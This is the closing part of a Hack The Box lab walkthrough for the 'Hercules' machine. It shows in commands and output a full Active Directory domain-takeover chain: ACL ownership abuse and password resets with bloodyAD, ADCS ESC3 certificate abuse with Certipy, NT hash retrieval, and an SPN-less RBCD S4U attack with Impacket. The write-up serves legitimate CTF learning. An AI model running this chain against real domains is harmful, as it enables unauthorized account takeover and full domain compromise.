+</doc-codeblock></div>
+<div class="flex mb-6">
+    <div class="shrink-0 w-1.5 rounded-tl-lg rounded-bl-lg bg-callout-info"></div>
+    <div class="flex w-full py-4 border border-l-0 rounded-tr-lg rounded-br-lg doc-callout bg-callout-base-bg border-callout-base-border" role="alert">
+        <div class="flex items-center ml-4 h-7">
+            <svg xmlns="http://www.w3.org/2000/svg" class="block text-callout-info" width="22" height="22" viewBox="0 0 24 24" role="presentation">
+                <g fill="currentColor"><g>
+                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
+                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
+                    <path fill="none" d="M0 0h24v24H0z"></path>
+                </g></g>
+            </svg>
+        </div>
+        <div class="pr-5 ml-3 w-full">
+            <h5>The regular evil-winrm didn&#x27;t work, so I switched to the python version !!!</h5>
+<h2 id="root">Root</h2>
+<p>Again we look and the permissions of the <code translate="no" v-pre>auditor</code> user.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ bloodyAD -k -d hercules.htb --host dc.hercules.htb get writable
+
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=hercules,DC=htb
+permission: WRITE
+
+distinguishedName: OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
+permission: CREATE_CHILD; WRITE
+OWNER: WRITE
+DACL: WRITE
+
+distinguishedName: CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
+permission: WRITE</code></pre>
+</doc-codeblock></div>
+<p>Our user has full control (<code translate="no" v-pre>WriteDACL</code>) over the <code translate="no" v-pre>Forest Migration</code> OU. These permissions allows us to add ourself as the owner of this OU and give use the <code translate="no" v-pre>GenericAll</code> permission (a.k.a. FullControl).</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ bloodyAD -k -d hercules.htb --host dc.hercules.htb set owner 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' auditor
+[+] Old owner S-1-5-21-1889966460-2597381952-958560702-512 is now replaced by auditor on OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
+
+$ bloodyAD -k -d hercules.htb --host dc.hercules.htb add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' auditor
+[+] auditor has now GenericAll on OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb</code></pre>
+</doc-codeblock></div>
+<p>After we configure the <code translate="no" v-pre>GenericAll</code> over the OU, we have effectively given ourself control over all objects contained within it. The reason we could not do this before, even though we are part of a group that has the same permissions is because ACL inheritence was probably disabled. By adding ourself as owner we can configure these ACLs ourself and apply the inheritence.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ bloodyAD -k -d hercules.htb --host dc.hercules.htb get writable --otype USER
+
+distinguishedName: CN=Taylor Maxwell,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
+permission: CREATE_CHILD; WRITE
+OWNER: WRITE
+DACL: WRITE
+
+distinguishedName: CN=Fernando Rodriguez,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
+permission: CREATE_CHILD; WRITE
+OWNER: WRITE
+DACL: WRITE
+
+distinguishedName: CN=James Silver,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
+permission: CREATE_CHILD; WRITE
+OWNER: WRITE
+DACL: WRITE
+
+distinguishedName: CN=Anthony Rudd,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
+permission: CREATE_CHILD; WRITE
+OWNER: WRITE
+DACL: WRITE
+
+distinguishedName: CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
+permission: WRITE</code></pre>
+</doc-codeblock></div>
+<p>We get access to 4 additional users and discover also a path to perform the <code translate="no" v-pre>ADCSESC3</code> attack via the user <code translate="no" v-pre>Fernando.R</code> is  part of the <code translate="no" v-pre>Forest Migration</code> OU, but is <code translate="no" v-pre>Disabled</code>.</p>
+<figure class="content-center">
+    <img src="../../../../assets/images/writeups/hercules/bloodhound-fernando.png" alt="ADCS ESC3 Path" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" width="1807" height="750" />
+    <figcaption class="caption">ADCS ESC3 Path</figcaption>
+</figure>
+<p>So with our <code translate="no" v-pre>GenericAll</code> over this account, we can enable his account and reset his password.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ bloodyAD -k -d hercules.htb --host dc.hercules.htb remove uac 'fernando.r' -f ACCOUNTDISABLE
+[-] ['ACCOUNTDISABLE'] property flags removed from fernando.r's userAccountControl
+
+$ bloodyAD -k -d hercules.htb --host dc.hercules.htb set password fernando.r 'Pwn3d_by_ACLs!'
+[+] Password changed successfully!</code></pre>
+</doc-codeblock></div>
+<p>We confirm with Certipy the attack we identified with BloodHound.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ certipy find -k -target dc.hercules.htb -vulnerable -stdout
+
+Template Name                       : EnrollmentAgent
+    Display Name                        : Enrollment Agent
+    Certificate Authorities             : CA-HERCULES
+    Enabled                             : True
+    Client Authentication               : False
+    Enrollment Agent                    : True
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectAltRequireUpn
+                                          SubjectRequireDirectoryPath
+    Enrollment Flag                     : AutoEnrollment
+    Extended Key Usage                  : Certificate Request Agent
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 1
+    Validity Period                     : 2 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2024-12-04T01:44:26+00:00
+    Template Last Modified              : 2024-12-04T01:44:51+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : HERCULES.HTB\Smartcard Operators
+                                          HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : HERCULES.HTB\Enterprise Admins
+        Full Control Principals         : HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+        Write Owner Principals          : HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+        Write Dacl Principals           : HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+        Write Property Enroll           : HERCULES.HTB\Domain Admins
+                                          HERCULES.HTB\Enterprise Admins
+    [+] User Enrollable Principals      : HERCULES.HTB\Smartcard Operators
+    [!] Vulnerabilities
+      ESC3                              : Template has Certificate Request Agent EKU set.</code></pre>
+</doc-codeblock></div>
+<p>We can now perform the attack. First we request a certificate for the <code translate="no" v-pre>EnrollmentAgent</code> template.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ certipy req -k -target dc.hercules.htb -ca CA-HERCULES -template EnrollmentAgent -dc-ip 10.10.11.91 -dc-host dc.hercules.htb
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 6
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'fernando.r@hercules.htb'
+[*] Certificate object SID is 'S-1-5-21-1889966460-2597381952-958560702-1121'
+[*] Saving certificate and private key to 'fernando.r.pfx'
+[*] Wrote certificate and private key to 'fernando.r.pfx'</code></pre>
+</doc-codeblock></div>
+<p>Subsequently, we can request a certificate on behalf of any user from any other template by including the initial certificate as proof. However, we are not able to request a certificate for the <code translate="no" v-pre>Administrator</code> account since this user is part of the <code translate="no" v-pre>Protected Users</code> group. One thing to note is that the <code translate="no" v-pre>IIS_Administrator</code> account is also part of the <code translate="no" v-pre>Forest Migration</code> OU.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ nxc ldap dc.hercules.htb --use-kcache -M whoami -o USER='IIS_Administrator'
+LDAP        dc.hercules.htb 389    DC               [*] None (name:DC) (domain:hercules.htb)
+LDAP        dc.hercules.htb 389    DC               [+] hercules.htb\auditor from ccache 
+WHOAMI      dc.hercules.htb 389    DC               distinguishedName: CN=IIS_Administrator,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
+WHOAMI      dc.hercules.htb 389    DC               Member of: CN=Service Operators,OU=Domain Groups,OU=DCHERCULES,DC=hercules,DC=htb
+WHOAMI      dc.hercules.htb 389    DC               name: IIS_Administrator
+WHOAMI      dc.hercules.htb 389    DC               Enabled: No
+WHOAMI      dc.hercules.htb 389    DC               Password Never Expires: Yes
+WHOAMI      dc.hercules.htb 389    DC               Last logon: 0
+WHOAMI      dc.hercules.htb 389    DC               pwdLastSet: 133777502835357235
+WHOAMI      dc.hercules.htb 389    DC               logonCount: 0
+WHOAMI      dc.hercules.htb 389    DC               sAMAccountName: iis_administrator</code></pre>
+</doc-codeblock></div>
+<p>We still need to figure out how to reset the password of <code translate="no" v-pre>IIS_Administrator</code> because it appears we don&#x27;t have the same <code translate="no" v-pre>GenericAll</code> permissions applied to this user via inheritence. The only user of interest which we haven&#x27;t explored yet is <code translate="no" v-pre>Ashley.B</code>. This account is part of <code translate="no" v-pre>IT Support</code> and the <code translate="no" v-pre>Remote Management Users</code> group.</p>
+<figure class="content-center">
+    <img src="../../../../assets/images/writeups/hercules/bloodhound-ashley.png" alt="BloodHound Ashley Membership" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" width="1613" height="492" />
+    <figcaption class="caption">BloodHound Ashley Membership</figcaption>
+</figure>
+<p>So it seems like a natural move to request a certificate on behalf of this user.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ certipy req -k -target dc.hercules.htb -ca CA-HERCULES -template User -on-behalf-of 'hercules\ashley.b' -pfx fernando.r.pfx -dc-ip 10.10.11.91 -dc-host dc.hercules.htb -dcom
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via DCOM
+[*] Request ID is 12
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'ashley.b@hercules.htb'
+[*] Certificate object SID is 'S-1-5-21-1889966460-2597381952-958560702-1135'
+[*] Saving certificate and private key to 'ashley.b.pfx'
+[*] Wrote certificate and private key to 'ashley.b.pfx'
+
+$ certipy auth -pfx ashley.b.pfx -dc-ip 10.10.11.91
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'ashley.b@hercules.htb'
+[*]     Security Extension SID: 'S-1-5-21-1889966460-2597381952-958560702-1135'
+[*] Using principal: 'ashley.b@hercules.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'ashley.b.ccache'
+[*] Wrote credential cache to 'ashley.b.ccache'
+[*] Trying to retrieve NT hash for 'ashley.b'
+[*] Got hash for 'ashley.b@hercules.htb': aad3b435b51404eeaad3b435b51404ee:1e719fbfddd226da74f644eac9df7fd2
+
+$ getTGT.py hercules.htb/ashley.b -hashes :1e719fbfddd226da74f644eac9df7fd2
+
+$ KRB5CCNAME=ashley.b.ccache evil-winrm-py -k -i dc.hercules.htb --ssl</code></pre>
+</doc-codeblock></div>
+<p>We then find some scripts and a mail on her desktop.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">evil-winrm-py PS C:\Users\ashley.b\Desktop\Mail&gt; type RE_ashley.eml
+--_004_MEYP282MB3102AC3B2MEYP282MB3102AUSP_
+Content-Type: multipart/alternative;
+        boundary=&quot;_000_MEYP282MB3102AC3E29FED8B2MEYP282MB3102AUSP_&quot;
+
+--_000_MEYP282MB3102AC3E2MEYP282MB3102AUSP_
+Content-Type: text/plain; charset=&quot;us-ascii&quot;
+Content-Transfer-Encoding: quoted-printable
+
+Hello Ashley,
+
+The issue you are facing is that some members in the Department were once p=
+art of sensitive groups which are blocking your permissions.
+
+I've discussed your issue at length with security and here is a solution th=
+at we feel works for both us and your team. I've attached a copy of the scr=
+ipt your team should run to your home folder. For convenience, We have prov=
+ided a shortcut to the script in the IT share. You may also run the task ma=
+nually from powershell.
+
+If you have any other issues feel free to inform me.
+
+Regards, Domain Admins.
+
+________________________________
+From: Ashley Browne
+Sent: Monday 09:49:37 AM
+To: Domain Admins &lt;Administrator@HERCULES.HTB&gt;
+Subject: Unable to reset user's password.
+
+Good Morning,
+
+Today one of my staff received a password reset request from a user, but fo=
+r some reason they were unable to perform the action due to invalid permiss=
+ions. I have double checked against another user and confirmed our team has=
+permission to handle password changes in the department the user belongs to=
+. I was told to contact you for further assistance.
+
+For reference the user is &quot;will.s&quot; from the &quot;Engineering Department&quot; Unit.
+
+I look forward to your reply.
+
+Regards, Ashley.
+
+--_000_MEYP282MB3102AC3E21A33MEYP282MB3102AUSP_
+Content-Type: text/html; charset=&quot;us-ascii&quot;
+Content-Transfer-Encoding: quoted-printable</code></pre>
+</doc-codeblock></div>
+<p>They talk about a problem with resetting certain passwords due to the permission of old accounts. There is also a script located at <code translate="no" v-pre>C:\Users\ashley.b\Scripts\cleanup.ps1</code> that is responsible for turning off ACL protections on each object under the control of <code translate="no" v-pre>HERCULES\IT Support</code>.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-powershell"><code v-pre class="language-powershell">function CanPasswordChangeIn {
+    param ($ace)
+    if($ace.ActiveDirectoryRights -match &quot;ExtendedRight|GenericAll&quot;){
+        return $true
+    }
+    return $false
+}
+
+function CanChangePassword {
+    param ($target, $object)
+
+    $acls = (Get-Acl -Path &quot;AD:$target&quot;).Access
+    foreach($ace in $acls){
+        if(($ace.IdentityReference -eq $object) -and (CanPasswordChangeIn $ace)){
+            return $true
+        }
+    }
+    return $false
+}
+
+function CleanArtifacts {
+    param($Object)
+
+    Set-ADObject -Identity $Object -Clear &quot;adminCount&quot;
+    $acl = Get-Acl -Path &quot;AD:$Object&quot;
+    $acl.SetAccessRuleProtection($False, $False)
+    Set-Acl -Path &quot;AD:$Object&quot; -AclObject $acl
+}
+
+$group = &quot;HERCULES\IT Support&quot;
+$objects = (Get-ADObject -Filter * -SearchBase &quot;OU=DCHERCULES,DC=HERCULES,DC=HTB&quot;).DistinguishedName
+$Path = &quot;C:\Users\ashley.b\Scripts\log.txt&quot;
+Set-Content -Path $Path -Value &quot;&quot;
+
+foreach($object in $objects){
+    if(CanChangePassword $object $group){
+        $Members = (Get-ADObject -Filter * -SearchBase $object | Where-Object { $_.DistinguishedName -ne $object }).DistinguishedName
+
+        foreach($DN in $Members){
+            try {
+                CleanArtifacts $DN
+            } 
+            catch {
+                $_.Exception.Message | Out-File $Path -Append
+            }
+            &quot;Cleanup : $DN&quot; | Out-File $Path -Append
+        }
+    }
+}</code></pre>
+</doc-codeblock></div>
+<p>In essence, where Ashley&#x27;s group appears to have rights on an OU/container, the script walks that container and unprotects every object inside (clears adminCount and re-enables inheritance). We can run the cleanup script and check the logs.</p>
+<figure class="content-center">
+    <img src="../../../../assets/images/writeups/hercules/cleanup-script-log.png" alt="Cleanup Script Logs" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" width="1208" height="515" />
+    <figcaption class="caption">Cleanup Script Logs</figcaption>
+</figure>
+<p>The plan is to also reset the ACL permissions on the <code translate="no" v-pre>IIS_Administrator</code> account so we can reset its password via <code translate="no" v-pre>auditor</code>.
+To do this, we need to grant the <code translate="no" v-pre>GenericAll</code> permissions over the <code translate="no" v-pre>Forest Migration</code> OU to <code translate="no" v-pre>IT Support</code> so that after running the script the permissions are also applied to our target user.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ KRB5CCNAME=auditor.ccache bloodyAD -k -d hercules.htb --host dc.hercules.htb add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' 'IT Support'
+[+] IT Support has now GenericAll on OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb</code></pre>
+</doc-codeblock></div>
+<figure class="content-center">
+    <img src="../../../../assets/images/writeups/hercules/cleanup-script-log2.png" alt="Cleanup Script Logs" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" width="1590" height="800" />
+    <figcaption class="caption">Cleanup Script Logs</figcaption>
+</figure>
+<p>Only after running the cleanup script we are able to do the enable of the IIS account. Due to cleanup scripts we also need to add our permissions over the <code translate="no" v-pre>Forest Migration</code> OU again.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ bloodyAD -k -d hercules.htb --host dc.hercules.htb add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' auditor
+[+] auditor has now GenericAll on OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
+
+$ bloodyAD -k -d hercules.htb --host dc.hercules.htb remove uac 'IIS_Administrator' -f ACCOUNTDISABLE
+[-] ['ACCOUNTDISABLE'] property flags removed from IIS_Administrator's userAccountControl
+
+$ bloodyAD -k -d hercules.htb --host dc.hercules.htb set password IIS_Administrator 'Pwn3d_by_ACLs!'
+[+] Password changed successfully!</code></pre>
+</doc-codeblock></div>
+<p>With the password changed, we can continue the attack chain and compromise <code translate="no" v-pre>IIS_Webserver$</code>.</p>
+<figure class="content-center">
+    <img src="../../../../assets/images/writeups/hercules/bloodhound-iis-administrator.png" alt="BloodHound Path from IIS_Administrator" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" width="1769" height="612" />
+    <figcaption class="caption">BloodHound Path from IIS_Administrator</figcaption>
+</figure>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ getTGT.py hercules.htb/IIS_Administrator:Pwn3d_by_ACLs!
+Impacket v0.13.0.dev0+20250206.100953.075f2b10 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Saving ticket in IIS_Administrator.ccache
+$ export KRB5CCNAME=IIS_Administrator.ccache
+
+$ bloodyAD -k -d hercules.htb --host dc.hercules.htb set password 'IIS_Webserver$' 'Pwn3d_by_ACLs!'
+[+] Password changed successfully!
+
+$ getTGT.py hercules.htb/IIS_Webserver$:Pwn3d_by_ACLs!
+Impacket v0.13.0.dev0+20250206.100953.075f2b10 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Saving ticket in IIS_Administrator.ccache
+$ export KRB5CCNAME=IIS_Webserver\$.ccache
+
+$ getST.py -u2u -impersonate Administrator -spn 'cifs/dc.hercules.htb' -k -no-pass 'hercules.htb'/'IIS_Webserver$'
+Impacket v0.13.0.dev0+20250206.100953.075f2b10 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Impersonating Administrator
+[*] Requesting S4U2self+U2U
+[*] Requesting S4U2Proxy
+[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
+[-] Probably SPN is not allowed to delegate by user IIS_Webserver$ or initial TGT not forwardable</code></pre>
+</doc-codeblock></div>
+<p>Next we need to perform an RBCD attack on the SPN-less user <code translate="no" v-pre>IIS_Webserver$</code>. The technique is as follows:</p>
+<ol>
+<li>Obtain a TGT for the SPN-less user allowed to delegate to a target and retrieve the TGT session key.</li>
+<li>Change the user&#x27;s password hash and set it to the TGT session key.</li>
+<li>Combine S4U2self and U2U so that the SPN-less user can obtain a service ticket to itself, on behalf of another (powerful) user, and then proceed to S4U2proxy to obtain a service ticket to the target the user can delegate to, on behalf of the other, more powerful, user.</li>
+<li>Pass the ticket and access the target, as the delegated other</li>
+</ol>
+<p>First, we need to obtain a TGT using the account NT hash to retrieve the TGT session key.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ iconv -f ASCII -t UTF-16LE &lt;(printf 'Pwn3d_by_ACLs!') | openssl dgst -md4 -provider legacy
+MD4(stdin)= b85458493b2354f14cde47b01ed69ab5
+
+$ getTGT.py -hashes :b85458493b2354f14cde47b01ed69ab5 'hercules.htb/IIS_Webserver$' -dc-ip 10.10.11.91
+Impacket v0.13.0.dev0+20250206.100953.075f2b10 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Saving ticket in IIS_Webserver$.ccache
+
+$ describeTicket.py IIS_Webserver\$.ccache | grep 'Ticket Session Key'
+[*] Ticket Session Key            : 53be5595e62fed2568632bef290d456b</code></pre>
+</doc-codeblock></div>
+<p>Change the user&#x27;s password with the TGT session key.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ changepasswd.py -newhashes :53be5595e62fed2568632bef290d456b 'hercules.htb'/'IIS_Webserver$':'Pwn3d_by_ACLs!'@dc.hercules.htb -k
+Impacket v0.13.0.dev0+20250206.100953.075f2b10 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Changing the password of hercules.htb\IIS_Webserver$
+[*] Connecting to DCE/RPC as hercules.htb\IIS_Webserver$
+[*] Password was changed successfully.
+[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).</code></pre>
+</doc-codeblock></div>
+<p>Finally, use the configured delegation to impersonate a user and request a service ticket for the desired service on the target machine:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ getST.py -u2u -impersonate Administrator -spn 'cifs/dc.hercules.htb' -k -no-pass 'hercules.htb'/'IIS_Webserver$'
+Impacket v0.13.0.dev0+20250206.100953.075f2b10 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Impersonating Administrator
+[*] Requesting S4U2self+U2U
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
+
+$ KRB5CCNAME=Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache nxc smb DC.hercules.htb --use-kcache
+SMB         DC.hercules.htb 445    DC               [*]  x64 (name:DC) (domain:hercules.htb) (signing:True) (SMBv1:False)
+SMB         DC.hercules.htb 445    DC               [+] hercules.htb\Administrator from ccache (Pwn3d!)</code></pre>
+</doc-codeblock></div>
+<p>Holy cow, road to Domain Admin was a real brainfuck. This was by far one of the hardest boxes I solved. GG.</p>
+        </div>
+    </div>
+</div>
+        </div>
+    </div>
+</div>
+
+                
+                <!-- Required only on API pages -->
+                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
+            </div>
+            <footer id="retype-content-footer" class="clear-both">
+            
+                <nav id="retype-nextprev" class="print:hidden flex mt-14">
+                    <div class="w-1/2">
+                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/hackthebox/machines/darkcorp/">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                            <span>
+                                <span class="block text-xs font-normal text-base-text-muted">Previous</span>
+                                <span class="block mt-1">Dark​Corp (Insane)</span>
+                            </span>
+                        </a>
+                    </div>
+            
+                    <div class="w-1/2">
+                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/hackthebox/machines/infiltrator/">
+                            <span>
+                                <span class="block text-xs font-normal text-right text-base-text-muted">Next</span>
+                                <span class="block mt-1">Infiltrator (Insane)</span>
+                            </span>
+                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                        </a>
+                    </div>
+                </nav>
+            </footer>
+        </main>
+
+        <div id="retype-page-footer" class="print:border-none border-t border-base-border pt-6 mb-8">
+            <footer class="flex flex-wrap items-center justify-between print:justify-center">
+                <div id="retype-footer-links" class="print:hidden">
+                    <ul class="flex flex-wrap items-center text-sm">
+                    </ul>
+                </div>
+                <div id="retype-copyright" class="print:justify-center py-2 text-footer-text font-footer-link text-sm leading-relaxed"><p>© Copyright 2026. All rights reserved.</p></div>
+            </footer>
+        </div>
+    </div>
+
+    <!-- Rendered if sidebar right is enabled -->
+    <!-- Sidebar right skeleton-->
+    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-sidebar-right-bg border-sidebar-right-border lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:translate-x-0 sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton">
+        <div class="pl-5">
+            <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+            <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+            <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+        </div>
+    </div>
+
+    <!-- User should be able to hide sidebar right -->
+    <doc-sidebar-right v-cloak></doc-sidebar-right>
+</div>
+
+        </div>
+    </div>
+
+    <doc-search-mobile></doc-search-mobile>
+    <doc-back-to-top></doc-back-to-top>
+</div>
+
+
+    <div id="retype-overlay-target"></div>
+
+        <script data-cfasync="false">window.__DOCS__ = { "title": "Hercules (Insane)", level: 4, icon: "file", hasPrism: true, hasInstagram: false, hasMermaid: false, hasMath: false, tocDepth: 23, "md": "/writeups/hackthebox/machines/hercules.md" }</script>
+</body>
+</html>
